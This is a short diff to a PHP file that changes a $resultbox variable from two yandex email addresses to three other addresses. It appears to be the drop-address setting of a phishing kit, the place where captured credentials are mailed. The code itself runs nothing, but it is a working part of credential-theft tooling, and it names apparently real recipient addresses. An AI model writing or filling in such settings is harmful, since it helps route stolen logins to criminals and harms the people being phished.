@@ -1,5 +1,5 @@
 <?php
 
-$resultbox = "alilogs2020@yandex.com,xantailogz@yandex.com";
+$resultbox = "ndfbadboi@yandex.com,ndfbadboi@gmail.com, nodayoff231@vivaldi.net";
 
 ?>
